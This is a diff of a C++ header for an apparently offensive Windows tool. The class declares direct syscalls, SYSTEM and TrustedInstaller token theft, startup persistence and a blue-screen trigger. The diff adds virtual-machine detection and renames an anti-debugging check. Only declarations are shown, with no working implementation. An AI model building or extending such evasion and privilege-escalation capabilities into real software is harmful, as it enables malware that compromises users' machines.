@@ -8,8 +8,6 @@
 #include <iostream>
 #include "Syscalls.h"
 
-#pragma comment(lib, "ntdll.lib")
-
 extern "C" void* GetPebAddress(); // Get the address of the current processes PEB.
 extern "C" void* InsertSyscall(unsigned int ssn);
 
@@ -39,7 +37,6 @@ enum class SecurityContext {
 class ProcessManager {
 public:
     ProcessManager();
-    ~ProcessManager();
 
     HMODULE            GetLoadedLib(std::string libName);            // Return a handle of an already loaded dll from 'loadedDlls'
     BOOL               FreeUsedLibrary(std::string lib);             // Free a loaded library 'lib'
@@ -50,7 +47,7 @@ public:
     DWORD              StartWindowsService(std::string serviceName); // Start a Windows service 'serviceName'—return process id.
     HANDLE             GetSystemToken();                             // Get a SYSTEM permissions security token from winlogon.exe.
     HANDLE             GetTrustedInstallerToken();                   // Obtain a Trusted Installer security token.
-    BOOL               CheckNoDebugger();                            // Check if the current process is being debugged by looking at PEB
+    static bool        BeingDebugged();                            // Check if the current process is being debugged by looking at PEB
     void               BSOD();                                       // Cause a blue screen of death on the current machine
 
     // Wrapper that uses function pointer for CreateProcessWithTokenW
@@ -87,6 +84,7 @@ public:
     inline HANDLE GetToken() const { return this->m_ElevatedToken; }
     static unsigned int GetSSN(HMODULE lib, std::string functionName);
     void AddProcessToStartup();
+    static bool RunningInVirtualMachine();
     void GetAndInsertSSN(HMODULE lib, std::string functionName);
     inline const SecurityContext GetProcessSecurityContext() const { return this->m_Context; }
     static FARPROC GetFunctionAddressInternal(HMODULE lib, std::string procedure); // Get a function pointer to an export function 'procedure' located in 'lib'
